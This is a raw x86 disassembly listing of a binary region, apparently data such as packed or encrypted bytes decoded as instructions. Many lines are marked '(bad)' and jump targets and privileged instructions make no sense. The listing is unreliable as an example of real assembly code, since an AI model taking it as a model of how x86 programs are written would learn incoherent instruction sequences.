  4185c2:	jo     0x418643
  4185c4:	dec    BYTE PTR [ebx]
  4185c6:	xchg   edi,eax
  4185c7:	test   BYTE PTR [esi],0xc7
  4185ca:	sbb    dh,BYTE PTR [ebx-0x3]
  4185cd:	jmp    DWORD PTR [edi]
  4185cf:	pop    edx
  4185d0:	call   0xfec0b796
  4185d5:	mov    ebx,edx
  4185d7:	jge    0x4185a1
  4185d9:	ret    0x5a1f
  4185dc:	push   ebx
  4185dd:	mov    esi,DWORD PTR [ebx-0x55]
  4185e0:	dec    ebp
  4185e1:	pop    eax
  4185e2:	out    dx,eax
  4185e3:	ja     0x4185dd
  4185e5:	inc    eax
  4185e6:	pop    ss
  4185e7:	jb     0x418658
  4185e9:	add    DWORD PTR [edi+edi*2+0x2a],edx
  4185ed:	(bad)  [eax]
  4185ef:	cmc    
  4185f0:	add    eax,0xfe7ea6e8
  4185f5:	(bad)  
  4185f6:	fcomp  QWORD PTR [ecx]
  4185f8:	push   cs
  4185f9:	test   BYTE PTR [ecx+0x5a],ch
	...
  418628:	inc    eax
  418629:	cmc    
  41862a:	add    eax,0xfd57c3e8
  41862f:	(bad)  
  418630:	fcomp  QWORD PTR [ecx]
  418632:	je     0x418639
  418634:	ds inc esp
  418636:	std    
  418637:	jmp    DWORD PTR [edi-0x6ff38b88]
  41863d:	jecxz  0x418644
  41863f:	call   0x400038
  418644:	jo     0x418629
  418646:	add    eax,0xfd5bf6e8
  41864b:	dec    DWORD PTR [ecx+ebx*1-0x1083fd8c]
  418652:	(bad)  
  418653:	jne    0x4185f4
  418655:	jno    0x418679
  418657:	sbb    al,0xa0
  418659:	jns    0x418665
  41865b:	ror    BYTE PTR [edx+0x5d],0xe9
  41865f:	arpl   WORD PTR [esi],di
  418661:	in     eax,dx
  418662:	xchg   edi,eax
  418663:	pop    es
  418664:	push   esi
  418665:	push   0xc859ff00
  41866a:	inc    ecx
  41866b:	je     0x4186a9
  41866d:	jmp    0x7531ee29
  418672:	ret    
  418673:	inc    DWORD PTR [eax-0x32]
  418676:	or     eax,ebp
  418678:	repnz pop ebp
  41867a:	and    esi,edi
  41867c:	inc    ebp
  41867d:	jb     0x418616
  41867f:	add    DWORD PTR ds:0x367422f1,edx
  418685:	sbb    bl,BYTE PTR [eax]
  418687:	sbb    bl,BYTE PTR [ecx]
  418689:	push   ds
  41868a:	or     eax,0xc0
	...
  4186b3:	add    BYTE PTR [eax],al
  4186b5:	add    BYTE PTR [ebx+0x9332eb0],cl
  4186bb:	or     BYTE PTR [edx],cl
  4186bd:	call   0xfe641d34
  4186c2:	inc    ebp
  4186c3:	jb     0x41865c
  4186c5:	add    ebp,esp
  4186c7:	pushf  
  4186c8:	and    dh,BYTE PTR [esi+esi*1+0x5a]
  4186cc:	sbb    DWORD PTR [ecx+eiz*8],edx
  4186cf:	push   ebp
  4186d0:	test   edi,esi
  4186d2:	push   ds
  4186d3:	inc    ebp
  4186d4:	add    ebp,DWORD PTR [ebx]
  4186d6:	dec    cl
  4186d8:	inc    ecx
  4186d9:	jae    0x418708
  4186db:	lar    eax,WORD PTR [eax]
  4186de:	cs mov dl,0x96
  4186e1:	or     esi,ebp
  4186e3:	mov    bl,0x1
  4186e5:	add    BYTE PTR [esi],bh
  4186e7:	test   eax,0xb23dbb08
  4186ec:	add    DWORD PTR [eax],eax
  4186ee:	mov    ch,0xf1
  4186f0:	mov    esi,0x1ca7cc8
  4186f5:	push   ebp
  4186f6:	lds    edx,FWORD PTR [esi+0x4b1657b1]
  4186fc:	sbb    edi,DWORD PTR [edi]
  4186fe:	or     dl,BYTE PTR ds:[eax+eax*1+0x22a65b7d]
  418706:	jmp    0xc9b3:0x41989e56
  41870d:	and    ah,BYTE PTR [eax-0x3c]
  418710:	loop   0x418755
  418712:	shl    BYTE PTR [eax-0x7a],cl
  418715:	cwde   
  418716:	inc    ebp
  418717:	(bad)  
  418718:	hlt    
  418719:	or     eax,DWORD PTR [eax]
	...
  418743:	add    BYTE PTR [esi+0x68],dl
  418746:	jbe    0x41876a
  418748:	inc    eax
  418749:	push   eax
  41874a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41874b:	cwde   
  41874c:	inc    esp
  41874d:	(bad)  
  41874e:	fmul   QWORD PTR [edi]
  418750:	xor    DWORD PTR [esi-0x11],ecx
  418753:	sub    edi,DWORD PTR ds:0xf62256c4
  418759:	cwde   
  41875a:	fild   WORD PTR [ebx]
  41875c:	jae    0x41872e
  41875e:	push   ebx
  41875f:	xchg   ch,bh
  418761:	mov    esi,0x2379ba9a
  418766:	mov    edi,0xe71b071d
  41876b:	sbb    ebp,DWORD PTR [edi+0x5a]
  41876e:	sub    ah,BYTE PTR [edx]
  418770:	and    al,0xa0
  418772:	pmaxub mm7,QWORD PTR [esp+eax*8+0x16]
  418777:	dec    edx
  418778:	jp     0x418731
  41877a:	out    0x3,eax
  41877c:	ds pop ebx
  41877e:	je     0x418748
  418780:	in     eax,0x2a
  418782:	rdmsr  
  418784:	sub    eax,0x4285f6c4
  418789:	mov    bh,0xe7
  41878b:	cwde   
  41878c:	push   ecx
  41878d:	(bad)  
  41878e:	sub    al,0x30
  418790:	add    DWORD PTR [ebx-0x3c570739],esi
  418796:	push   0xffffff9f
  418798:	xchg   ebp,eax
  418799:	pop    edx
  41879a:	push   esp
  41879b:	or     ecx,ebx
  41879d:	sbb    eax,0xa999b4d3
  4187a2:	shl    DWORD PTR [eax],cl
  4187a4:	mov    bh,dl
  4187a6:	add    BYTE PTR [eax+eax*1],dh
	...
  4187d1:	add    BYTE PTR [esi-0x3c],cl
  4187d4:	push   cs
  4187d5:	gs int3 
  4187d7:	ret    
  4187d8:	std    
  4187d9:	jmp    0x3a31a69e
  4187de:	pop    ds
  4187df:	dec    edi
  4187e0:	in     al,dx
  4187e1:	sbb    DWORD PTR [ecx-0x3c71023c],0xb0fbffcb
  4187eb:	add    al,0x63
  4187ed:	es jge 0x4187b3
  4187f0:	jmp    0x3de3:0xe41ef710
  4187f7:	pop    ebx
  4187f8:	add    BYTE PTR [esi],ch
  4187fa:	stc    
  4187fb:	mov    edx,0x5b3de900
  418800:	mov    ebp,DWORD PTR [ebp+edx*2+0x69d4fd12]
  418807:	sub    eax,ebp
  418809:	aad    0xfb
  41880b:	sar    ebp,0xf2
  41880e:	jge    0x41885e
  418810:	adc    BYTE PTR [edx-0x5f],ch
  418813:	mov    edx,0xc24bb500
  418818:	jae    0x41882b
  41881a:	and    dh,BYTE PTR [ecx-0x5]
  41881d:	push   ds
  41881e:	pop    ds
  41881f:	aad    0xd8
  418821:	push   ss
  418822:	leave  
  418823:	mov    edx,0xc1d676e8
  418828:	std    
  418829:	repnz adc al,BYTE PTR [edi+0x13]
  41882d:	push   0xffffffa9
  41882f:	mov    esi,0xc22e7d00
  418834:	dec    ebx
  418835:	add    eax,0x0
	...
  41885e:	add    BYTE PTR [eax],al
  418860:	jmp    0xd7b3:0x3de911da
  418867:	icebp  
  418868:	cmp    eax,0x529ee95b
  41886d:	pop    ebx
  41886e:	inc    ebp
  41886f:	imul   ebx,DWORD PTR [esi+0x7d0074c2],0x973f7d93
  418879:	jmp    0xb9b:0xeaac0b01
  418880:	int3   
  418881:	jmp    0xf044:0xd1776a0d
  418888:	daa    
  418889:	out    dx,eax
  41888a:	mov    ds:0xe8571673,eax
  41888f:	pop    ebp
  418890:	jle    0x41890d
  418892:	(bad)  
  418893:	call   DWORD PTR [edx+0x72]
  418896:	in     eax,0x50
  418898:	jae    0x418915
  41889a:	dec    BYTE PTR [ebx-0x36a5646c]
  4188a0:	in     al,0x8
  4188a2:	mov    ebp,esp
  4188a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188a5:	sbb    bl,BYTE PTR [ebp+0x567b88fe]
  4188ab:	push   esi
  4188ac:	out    0x5,eax
  4188ae:	data16 in al,dx
  4188b0:	ins    BYTE PTR es:[edi],dx
  4188b1:	sahf   
  4188b2:	std    
  4188b3:	not    ebp
  4188b5:	pop    esp
  4188b6:	sar    edi,0x88
  4188b9:	rol    BYTE PTR [esi+0x41],cl
  4188bc:	pop    ss
  4188bd:	fidivr WORD PTR [esi]
  4188bf:	add    BYTE PTR [eax],bl
  4188c1:	fcmove st,st(2)
  4188c3:	add    DWORD PTR [eax],eax
	...
  4188ed:	add    bh,ah
  4188ef:	pop    ebp
  4188f0:	mov    eax,DWORD PTR [ebp-0x183ad]
  4188f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188f7:	add    ah,dh
  4188f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188fa:	or     BYTE PTR [ebx-0x2],bh
  4188fd:	or     esp,DWORD PTR [edi]
  4188ff:	imul   eax,DWORD PTR [esp+eiz*4-0x7cffa22a],0xa
  418907:	push   0xfffffffb
  418909:	jmp    FWORD PTR [eax+0x30840d5c]
  41890f:	pop    eax
  418910:	add    BYTE PTR [eax],al
  418912:	sbb    dl,ah
  418914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418915:	(bad)  
  418916:	ds test eax,0xe6994f1d
  41891c:	sbb    ch,bh
  41891e:	xchg   ecx,eax
  41891f:	cwde   
  418920:	sub    al,0x41
  418922:	and    eax,0x882a1e01
  418927:	cmp    dl,BYTE PTR [edi-0x5d]
  41892a:	js     0x41891c
  41892c:	sbb    eax,0xea229ea
  418931:	mov    dh,0xc2
  418933:	xchg   ecx,eax
  418934:	imul   edi,ebp,0x67b4e861
  41893a:	test   BYTE PTR [ebx+eax*8-0x1],ah
  41893e:	ret    0x422e
  418941:	std    
  418942:	dec    ecx
  418943:	inc    eax
  418944:	mov    ah,0xe7
  418946:	fnstcw WORD PTR [ebx-0x942ffff]
  41894c:	adc    BYTE PTR [ebp-0x1e18b45],cl
	...
  41897a:	add    BYTE PTR [eax],al
  41897c:	sub    DWORD PTR [ebx],eax
  41897e:	pop    ds
  41897f:	mov    ah,0xda
  418981:	sub    BYTE PTR ds:0xe45e26fe,bl
  418987:	(bad)  
  418988:	adc    DWORD PTR [edi+eax*4-0x5d],ecx
  41898c:	or     BYTE PTR [edx-0x7742bae3],al
  418992:	hlt    
  418993:	jno    0x418997
  418995:	jb     0x4189ee
  418997:	repz lock jns 0x4189b8
  41899b:	out    0x14,eax
  41899d:	enter  0xfe1e,0xf9
  4189a1:	das    
  4189a2:	pop    esp
  4189a3:	std    
  4189a4:	fst    DWORD PTR [ecx+0x4]
  4189a7:	add    BYTE PTR [esi],bh
  4189a9:	mov    dl,0xa7
  4189ab:	add    DWORD PTR [ebx-0x3e02a3c9],edi
  4189b1:	leave  
  4189b2:	mov    cl,0xfe
  4189b4:	repz (bad) 
  4189b6:	sbb    edi,esi
  4189b8:	mov    cl,0x5b
  4189ba:	iret   
  4189bb:	(bad)  
  4189bc:	dec    ebp
  4189bd:	rcr    dh,0xa
  4189c0:	jle    0x418a12
  4189c2:	imul   ebx,DWORD PTR [ebx],0xffffff99
  4189c5:	shl    bh,0x84
  4189c8:	rol    BYTE PTR [ebx],cl
  4189ca:	(bad)  
  4189cb:	push   ds
  4189cc:	mov    BYTE PTR [esi],cl
  4189ce:	and    DWORD PTR [esi+edi*1],eax
  4189d1:	push   eax
  4189d2:	ins    BYTE PTR es:[edi],dx
  4189d3:	sub    edi,DWORD PTR [ecx-0x40]
  4189d6:	out    0x90,eax
  4189d8:	mov    edx,0x681ea5c4
  4189dd:	sub    ecx,DWORD PTR [edi]
  4189df:	or     BYTE PTR [eax],al
	...
  418a09:	add    BYTE PTR [edi],bh
  418a0b:	pop    ebx
  418a0c:	out    0x2b,eax
  418a0e:	inc    edi
  418a0f:	pop    eax
  418a10:	out    0x3,eax
  418a12:	inc    ebp
  418a13:	fwait
  418a14:	test   BYTE PTR [edi+0x3e75b78],0x3
  418a1b:	push   edi
  418a1c:	call   0x6691c824
  418a21:	inc    edi
  418a22:	xor    eax,eax
  418a24:	out    0x2b,eax
  418a26:	int    0x57
  418a28:	out    0x3,eax
  418a2a:	mov    ?,WORD PTR [ebx]
  418a2c:	sub    dl,BYTE PTR [edx-0x77a3a482]
  418a32:	inc    eax
  418a34:	inc    esi
  418a35:	push   ds
  418a36:	jns    0x4189eb
  418a38:	xor    DWORD PTR [esi],eax
  418a3a:	ds pop ebx
  418a3c:	push   0x47
  418a3e:	inc    ebp
  418a3f:	xor    eax,0xc3ba90e7
  418a44:	and    eax,0xf2ae81e
  418a49:	cmp    BYTE PTR [ebx],bh
  418a4b:	pop    ebx
  418a4c:	out    0x90,eax
  418a4e:	ret    0xdc3
  418a51:	push   ds
  418a52:	shr    BYTE PTR [edx],1
  418a54:	mov    cr4,ebx
  418a57:	sar    dh,0x9
  418a5a:	inc    BYTE PTR [ebp+0x0]
  418a5d:	leave  
  418a5e:	in     eax,0xd1
  418a60:	dec    eax
  418a61:	test   al,0x3d
  418a63:	into   
  418a64:	and    edx,0x48
  418a67:	sar    ebp,0x39
  418a6a:	push   edx
  418a6b:	pop    edi
  418a6c:	sbb    eax,0xd6
	...
  418a95:	add    BYTE PTR [eax],al
  418a97:	add    BYTE PTR [ebx],bh
  418a99:	iret   
  418a9a:	xchg   ebx,eax
  418a9b:	stos   DWORD PTR es:[edi],eax
  418a9c:	xor    cl,al
  418a9e:	std    
  418a9f:	sbb    edx,edx
  418aa1:	mov    bh,0x64
  418aa3:	fisub  WORD PTR [edx]
  418aa5:	shr    ecx,0xda
  418aa8:	enter  0xc2d6,0xaf
  418aac:	push   ebx
  418aad:	rcl    DWORD PTR [eax+0x74],0xc1
  418ab1:	(bad)  
  418ab2:	(bad)  
  418ab3:	sahf   
  418ab4:	inc    ebx
  418ab5:	adc    al,ch
  418ab7:	xchg   edx,eax
  418ab8:	pop    eax
  418ab9:	sar    ch,0x60
  418abc:	mov    ecx,0x2b86ff03
  418ac1:	shl    DWORD PTR [ebx-0x23edfc3],0x76
  418ac8:	xchg   ecx,eax
  418ac9:	retf   0x6efe
  418acc:	push   ebx
  418acd:	mov    dh,0xf0
  418acf:	dec    DWORD PTR [edx-0x43]
  418ad2:	or     DWORD PTR [ecx],ebp
  418ad4:	(bad)  
  418ad5:	mov    DWORD PTR [eax+0x26],ebp
  418ad8:	scas   eax,DWORD PTR es:[edi]
  418ad9:	sbb    eax,DWORD PTR [eax]
  418adb:	inc    ecx
  418adc:	inc    ecx
  418add:	push   ebp
  418ade:	add    cl,ch
  418ae0:	int    0x36
  418ae2:	int    0xba
  418ae4:	cld    
  418ae5:	mov    esi,0xc0667cfe
  418aea:	std    
  418aeb:	cs and dh,ah
  418aee:	and    eax,0xff344b26
  418af3:	xchg   edx,eax
  418af4:	cmp    eax,0x71160031
  418af9:	add    bh,bh
  418afb:	push   cs
	...
  418b24:	add    BYTE PTR [eax],al
  418b26:	xor    esi,DWORD PTR [esi]
  418b28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b29:	add    BYTE PTR [edi-0x28960267],cl
  418b2f:	jb     0x418b9e
  418b31:	pop    es
  418b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b33:	pop    edx
  418b34:	std    
  418b35:	mov    ch,0x63
  418b37:	pop    ebp
  418b38:	(bad)  
  418b39:	dec    DWORD PTR [edi-0x7f00e6a5]
  418b3f:	pop    edi
  418b40:	mov    ah,0xa4
  418b42:	jno    0x418ba3
  418b44:	(bad)  
  418b45:	call   0x404fb9
  418b4a:	and    BYTE PTR ds:0x5fc0fef1,0xe5
  418b51:	ins    BYTE PTR es:[edi],dx
  418b52:	xchg   ebp,eax
  418b53:	pop    edi
  418b54:	(bad)  
  418b55:	cld    
  418b56:	je     0x418b72
  418b58:	mov    eax,0xfe5fa0ff
  418b5d:	repnz icebp 
  418b5f:	mov    eax,ds:0xa4ea0f06
  418b64:	sti    
  418b65:	inc    eax
  418b67:	add    BYTE PTR [edi-0x37],bl
  418b6a:	xchg   esp,eax
  418b6b:	add    eax,0x15d4ec8b
  418b70:	in     eax,dx
  418b71:	push   eax
  418b72:	dec    edi
  418b73:	out    dx,eax
  418b74:	(bad)  
  418b76:	addr16 push edi
  418b78:	clc    
  418b79:	jb     0x418b91
  418b7b:	sbb    edi,esi
  418b7d:	mov    esp,DWORD PTR [ebp+0x4a]
  418b80:	gs add eax,0xe8005a26
  418b86:	xor    ah,al
  418b88:	(bad)  
  418b89:	inc    DWORD PTR [eax]
	...
  418bb3:	add    BYTE PTR [edi-0x2d],ah
  418bb6:	iret   
  418bb7:	nop
  418bb8:	mov    ss,WORD PTR [ebp-0x73a36f07]
  418bbe:	lea    ebp,[eax-0x26]
  418bc1:	pop    eax
  418bc2:	add    BYTE PTR [eax],al
  418bc4:	dec    edi
  418bc5:	and    al,0x17
  418bc7:	inc    DWORD PTR [eax+0x4a]
  418bca:	mov    dl,dl
  418bcc:	ds cmp eax,esi
  418bcf:	out    dx,eax
  418bd0:	scas   al,BYTE PTR es:[edi]
  418bd1:	fild   DWORD PTR [esi]
  418bd3:	add    DWORD PTR [esi],edi
  418bd5:	mov    ah,0x29
  418bd7:	test   al,0x24
  418bd9:	mov    ebp,0x238c8a19
  418bde:	mov    cl,dl
  418be0:	(bad)  
  418be1:	neg    BYTE PTR [ecx]
  418be3:	mov    cl,BYTE PTR [eax+ecx*2-0x47e970ca]
  418bea:	add    al,0x0
  418bec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bee:	(bad)  
  418bef:	sti    
  418bf0:	and    al,0xb4
  418bf2:	sub    DWORD PTR [ebx+0x40],edx
  418bf5:	mov    ah,0x1
  418bf7:	nop
  418bf8:	mov    ch,0xe1
  418bfa:	(bad)  
  418bfb:	sar    DWORD PTR [ecx+0x7e],1
  418bfe:	adc    al,0x67
  418c00:	cmp    dh,BYTE PTR [ebx+0x3f560001]
  418c06:	(bad)  
  418c07:	(bad)  
  418c08:	ds leave 
  418c0a:	inc    ecx
  418c0b:	jae    0x418c3b
  418c0d:	cmp    DWORD PTR [esi],esi
  418c0f:	(bad)  
  418c10:	out    0xd1,al
  418c12:	xchg   ebp,eax
  418c13:	inc    eax
  418c14:	ds aad 0x8f
  418c17:	out    dx,eax
	...
  418c40:	add    BYTE PTR [eax],al
  418c42:	push   esi
  418c43:	mov    edi,edi
  418c45:	(bad)  
  418c46:	cmp    DWORD PTR ds:[esi],esi
  418c49:	imul   edi,DWORD PTR [esi],0x3c6a0458
  418c4f:	test   al,0x1
  418c51:	push   0x3d
  418c53:	stos   BYTE PTR es:[edi],al
  418c54:	add    DWORD PTR [eax],eax
  418c56:	ds jb  0x418c72
  418c59:	je     0x418c69
  418c5b:	sbb    ecx,DWORD PTR [edi]
  418c5d:	add    edi,DWORD PTR [esi]
  418c5f:	mov    dl,0x8c
  418c61:	inc    esp
  418c62:	or     dh,bl
  418c64:	push   cs
  418c65:	shl    BYTE PTR [ebx-0x12],0x1a
  418c69:	je     0x418c5d
  418c6b:	ins    DWORD PTR es:[edi],dx
  418c6c:	(bad)  
  418c6d:	out    dx,eax
  418c6e:	(bad)  
  418c6f:	pop    ebx
  418c70:	inc    DWORD PTR [eax]
  418c72:	ds pop ebx
  418c74:	xchg   ecx,eax
  418c75:	mov    bh,0x67
  418c77:	pop    ebx
  418c78:	push   ss
  418c79:	xchg   ecx,eax
  418c7a:	loope  0x418c2f
  418c7c:	jns    0x418c80
  418c7e:	ds pop ebx
  418c80:	repnz inc ebx
  418c82:	dec    ebp
  418c83:	dec    edi
  418c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c85:	stos   DWORD PTR es:[edi],eax
  418c86:	lahf   
  418c87:	dec    eax
  418c88:	test   al,0x3
  418c8a:	push   cs
  418c8b:	mov    bl,0xeb
  418c8d:	jmp    FWORD PTR [ecx+0x140451bc]
  418c93:	pop    ebx
  418c94:	push   ecx
  418c95:	push   es
  418c96:	and    al,0x5b
  418c98:	inc    ecx
  418c99:	pop    es
  418c9a:	es pop ebx
  418c9c:	out    0x3,eax
  418c9e:	jle    0x418c5c
  418ca0:	cmp    al,0x14
  418ca2:	cdq    
  418ca3:	in     al,dx
  418ca4:	jecxz  0x418ca9
	...
  418cce:	add    BYTE PTR [eax],al
  418cd0:	shr    BYTE PTR ds:[eax+edx*1],cl
  418cd4:	xor    DWORD PTR [edi+0x42],eax
  418cd7:	lods   al,BYTE PTR ds:[esi]
  418cd8:	push   esp
  418cd9:	dec    eax
  418cda:	sub    BYTE PTR [esi+edx*2],al
  418cdd:	add    al,0xe4
  418cdf:	add    edi,DWORD PTR [esi]
  418ce1:	sub    edi,edi
  418ce3:	cs int3 
  418ce5:	sbb    edi,esp
  418ce7:	sbb    dl,dl
  418ce9:	(bad)  
  418cea:	(bad)  
  418ceb:	fsubr  DWORD PTR [edx]
  418ced:	mov    esp,0x4638b37e
  418cf2:	jnp    0x418d1f
  418cf4:	int    0x56
  418cf6:	out    0x3,eax
  418cf8:	xchg   BYTE PTR [eax+0x27],dl
  418cfb:	nop
  418cfc:	aas    
  418cfd:	mov    al,0xaa
  418cff:	sbb    dl,BYTE PTR [edx-0x722d4041]
  418d05:	sbb    ah,bh
  418d07:	sbb    dl,BYTE PTR [edx+0x3a484fc3]
  418d0d:	pop    ebx
  418d0e:	out    0x86,eax
  418d10:	std    
  418d11:	dec    esi
  418d12:	add    cl,al
  418d14:	clc    
  418d15:	inc    edi
  418d16:	aas    
  418d17:	jmp    0xe9461f31
  418d1c:	cmp    eax,0xe395c050
  418d21:	xor    edx,esp
  418d23:	call   0x5882:0x14dbbfa
  418d2a:	add    cl,ch
  418d2c:	xor    BYTE PTR [ebx-0x4414258c],bl
  418d32:	addr16 jmp 0x418d38
	...
  418d5c:	add    BYTE PTR [eax],al
  418d5e:	push   esp
  418d5f:	inc    edi
  418d60:	clc    
  418d61:	out    dx,al
  418d62:	mov    ecx,0x729068ab
  418d67:	sbb    al,BYTE PTR [eax]
  418d69:	push   ebx
  418d6a:	inc    edx
  418d6b:	mov    esp,0xbfc1d6d0
  418d70:	call   0xfdfe12c6
  418d75:	(bad)  
  418d76:	mov    cl,0xab
  418d78:	call   0xfdfe02b6
  418d7d:	mov    dh,0xc1
  418d7f:	ret    
  418d80:	call   0xfdfdf2c6
  418d85:	mov    al,0xfb
  418d87:	mov    DWORD PTR es:[ebp+0x3ae097c3],ecx
  418d8e:	mov    ah,BYTE PTR [ebx]
  418d90:	push   0x7c271c
  418d95:	sub    DWORD PTR [eax-0x3c813ea6],0xfd223c77
  418d9f:	mov    edx,0xde34f5fd
  418da4:	cmp    esp,DWORD PTR [ecx]
  418da6:	repz sbb eax,DWORD PTR [eax]
  418da9:	jmp    0x296aed76
  418dae:	shl    DWORD PTR [ebx-0x4936d93f],cl
  418db4:	add    BYTE PTR [eax],al
  418db6:	pop    ss
  418db7:	pop    edi
  418db8:	add    bh,al
  418dba:	mov    ds:0xe7fffd56,al
  418dbf:	pop    esi
  418dc0:	lds    eax,FWORD PTR [ebp+0x0]
	...
  418deb:	add    BYTE PTR [ebx],ch
  418ded:	pop    edi
  418dee:	add    BYTE PTR [eax],al
  418df0:	xlat   BYTE PTR ds:[ebx]
  418df1:	sbb    eax,DWORD PTR [esp+esi*8-0x19]
  418df5:	pop    esi
  418df6:	add    BYTE PTR [eax],al
  418df8:	and    dl,bh
  418dfa:	in     eax,dx
  418dfb:	add    bh,dl
  418dfd:	pop    esi
  418dfe:	add    BYTE PTR [ebp-0x72b2b16e],cl
  418e04:	loop   0x418e70
  418e06:	dec    ebp
  418e07:	(bad)  
  418e08:	loop   0x418d8c
  418e0a:	dec    ebp
  418e0b:	push   0xffffff98
  418e0d:	loope  0x418e53
  418e0f:	cld    
  418e10:	or     DWORD PTR [bx+si],eax
  418e13:	push   0xffffffa4
  418e15:	or     dh,bh
  418e17:	(bad)  
  418e18:	xchg   edx,eax
  418e19:	xchg   edx,eax
  418e1a:	dec    edx
  418e1b:	inc    ecx
  418e1c:	xchg   edi,eax
  418e1d:	in     eax,0x44
  418e1f:	call   0x1275f38
  418e24:	xor    esp,DWORD PTR [esi+0x7f]
  418e27:	jge    0x418ea8
  418e29:	mov    ch,bh
  418e2b:	call   DWORD PTR [edi-0x17]
  418e2e:	jno    0x418e2f
  418e30:	inc    edx
  418e31:	push   ebx
  418e32:	mov    es,WORD PTR [ebp-0x61]
  418e35:	fistp  QWORD PTR [eax+edi*8+0x67]
  418e39:	jmp    0x3fea:0x571a8b57
  418e40:	mov    eax,0x6e865cf
  418e45:	(bad)  
  418e48:	sahf   
  418e49:	stc    
  418e4a:	(bad)  
  418e4c:	in     al,0x85
  418e4e:	push   ss
  418e4f:	sub    DWORD PTR [eax],eax
	...
  418e79:	add    BYTE PTR [eax-0xc3ff5ad],bl
  418e7f:	mov    esi,0x283e4588
  418e84:	stos   DWORD PTR es:[edi],eax
  418e85:	or     edx,DWORD PTR [esi]
  418e87:	pop    ecx
  418e88:	stc    
  418e89:	inc    BYTE PTR [ecx]
  418e8b:	and    DWORD PTR [esi+0xa03c9df],ecx
  418e91:	jmp    FWORD PTR [ebx+0x28]
  418e94:	mov    BYTE PTR [edi],bh
  418e96:	inc    edx
  418e97:	mov    esi,ecx
  418e99:	popf   
  418e9a:	ins    DWORD PTR es:[edi],dx
  418e9b:	add    eax,DWORD PTR [edx]
  418e9d:	(bad)  
  418e9e:	ds and eax,0xc47f7277
  418ea4:	test   dl,al
  418ea6:	push   edx
  418ea7:	imul   eax,esi,0x25debdeb
  418ead:	push   DWORD PTR [edx]
  418eaf:	sbb    eax,0xb0b27418
  418eb4:	jmp    0x418eed
  418eb6:	cmc    
  418eb7:	add    al,BYTE PTR [edx]
  418eb9:	(bad)  
  418eba:	sti    
  418ebb:	mov    edi,0xc43e0004
  418ec0:	test   BYTE PTR [esi+eiz*4-0x63],bh
  418ec4:	add    al,0x0
  418ec6:	ds ud0 ebp,eax
  418eca:	loop   0x418e6c
  418ecc:	adc    eax,0x1876bdfe
  418ed1:	(bad)  
  418ed2:	in     eax,dx
  418ed3:	mov    edx,0x86a7416
  418ed8:	lock aaa 
  418eda:	cmc    
  418edb:	add    BYTE PTR [eax+edi*4],0x0
	...
  418f07:	add    BYTE PTR [edi],bh
  418f09:	les    eax,FWORD PTR [ecx]
  418f0b:	add    ch,dh
  418f0d:	cli    
  418f0e:	inc    ecx
  418f0f:	push   esp
  418f10:	mov    ch,0x37
  418f12:	add    ebx,0x4fad546a
  418f18:	xchg   esi,eax
  418f19:	dec    edx
  418f1a:	scas   al,BYTE PTR es:[edi]
  418f1b:	(bad)  
  418f1c:	jle    0x418ee0
  418f1e:	sbb    DWORD PTR [ecx+0x3f],esi
  418f21:	add    eax,0x5b638216
  418f26:	xlat   BYTE PTR ds:[ebx]
  418f27:	retf   0x5b7e
  418f2a:	out    0x8f,eax
  418f2c:	inc    esi
  418f2d:	fcom   QWORD PTR [eax+ebx*4]
  418f30:	je     0x418f4c
  418f32:	out    0x3,eax
  418f34:	mov    esp,DWORD PTR [ecx+0x12]
  418f37:	inc    esp
  418f38:	cwde   
  418f39:	adc    al,0x30
  418f3b:	inc    ebx
  418f3c:	les    edx,FWORD PTR [esi+0x55]
  418f3f:	xchg   ebx,eax
  418f40:	jle    0x418f9d
  418f42:	inc    eax
  418f43:	jne    0x418f83
  418f45:	pop    ebx
  418f46:	out    0x2b,eax
  418f48:	lods   al,BYTE PTR ds:[esi]
  418f49:	sbb    BYTE PTR [esi],0x17
  418f4c:	mov    esp,0x7e934976
  418f51:	pop    ebx
  418f52:	out    0x8f,eax
  418f54:	sub    BYTE PTR [eax+0x6eb8ff7a],bh
  418f5a:	dec    ecx
  418f5b:	xchg   ebx,eax
  418f5c:	(bad)  
  418f5d:	pop    edx
  418f5e:	inc    DWORD PTR [edx+0xae75b3c]
  418f64:	jle    0x418f94
  418f66:	in     al,dx
  418f67:	sub    al,0x27
  418f69:	pop    edx
  418f6a:	out    0x3,eax
	...
  418f94:	add    BYTE PTR [eax],al
  418f96:	jns    0x418fb6
  418f98:	rol    DWORD PTR [ebx],cl
  418f9a:	ds pop ebx
  418f9c:	out    0x88,eax
  418f9e:	cli    
  418f9f:	mov    dh,0x17
  418fa1:	stos   BYTE PTR es:[edi],al
  418fa2:	jns    0x418fe6
  418fa4:	jmp    0x41a07bbf
  418fa9:	add    al,0x69
  418fab:	sub    al,0xe3
  418fad:	push   ss
  418fae:	dec    edx
  418faf:	aaa    
  418fb0:	xor    al,ch
  418fb2:	pop    ecx
  418fb3:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  418fb5:	(bad)  
  418fb6:	cmp    al,dl
  418fb8:	pusha  
  418fb9:	add    edi,DWORD PTR [esi]
  418fbb:	pop    ebx
  418fbc:	mov    ss,WORD PTR [edx-0x21a03cc3]
  418fc2:	cmp    BYTE PTR [eax-0x47d63f90],bh
  418fc8:	add    dl,bh
  418fca:	sub    eax,eax
  418fcc:	popf   
  418fcd:	jmp    0x41900c
  418fcf:	pop    ebx
  418fd0:	push   eax
  418fd1:	data16 scas al,BYTE PTR es:[edi]
  418fd3:	scas   eax,DWORD PTR es:[edi]
  418fd4:	push   eax
  418fd5:	pop    esi
  418fd6:	lods   al,BYTE PTR ds:[esi]
  418fd7:	pop    ebx
  418fd8:	push   0x5b42e9
  418fdd:	sar    DWORD PTR ds:0x25e9005f,0xce
  418fe4:	add    ecx,ebp
  418fe6:	cmp    eax,0xd4bdc064
  418feb:	mov    al,ds:0x5b3d2d43
  418ff0:	add    cl,ch
  418ff2:	(bad)  
  418ff3:	push   ds
  418ff4:	cld    
  418ff5:	mov    ecx,0xeb67b7a7
	...
  419022:	add    BYTE PTR [eax],al
  419024:	xor    BYTE PTR [edi],ch
  419026:	clc    
